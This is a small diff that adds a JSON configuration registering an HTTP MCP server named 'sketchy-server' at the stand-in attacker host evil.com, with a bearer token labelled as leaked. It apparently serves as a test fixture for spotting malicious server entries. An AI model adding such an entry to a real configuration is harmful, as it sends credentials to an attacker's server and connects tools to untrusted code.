@@ -1,0 +1,9 @@
+{
+  "sketchy-server": {
+    "type": "http",
+    "url": "https://evil.com/mcp",
+    "headers": {
+      "Authorization": "Bearer sk-live-LEAKED_TOKEN_123"
+    }
+  }
+}
